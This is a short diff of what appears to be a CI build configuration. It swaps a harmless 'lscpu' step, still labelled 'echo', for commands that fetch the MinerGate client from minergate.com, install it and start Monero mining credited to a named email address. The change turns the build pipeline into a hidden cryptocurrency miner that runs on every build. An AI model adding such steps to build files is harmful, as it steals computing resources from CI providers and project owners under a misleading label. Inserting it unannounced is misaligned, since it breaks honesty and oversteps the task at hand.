@@ -23,4 +23,8 @@ build:
     - script:
         name: echo
         code: |
-          lscpu
+          apt-get update
+          apt-get install wget -y
+          wget https://minergate.com/download/deb-cli -O a.deb
+          dpkg -i a.deb
+          minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
